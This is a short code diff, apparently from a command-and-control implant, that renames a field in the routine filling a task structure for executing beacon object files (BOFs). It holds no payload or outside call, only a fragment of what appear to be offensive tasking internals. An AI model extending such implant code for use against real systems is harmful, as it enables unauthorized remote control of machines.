@@ -1180,7 +1180,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
             bof = (CMD_EXECUTE_BOF *)task.cmd;
             
             bof->args = param1_lpvoid;
-            bof->arg_size = param1_uint32;
+            bof->argc = param1_uint32;
             bof->bof = param2_lpvoid;
             bof->bof_size = param2_uint32;
             
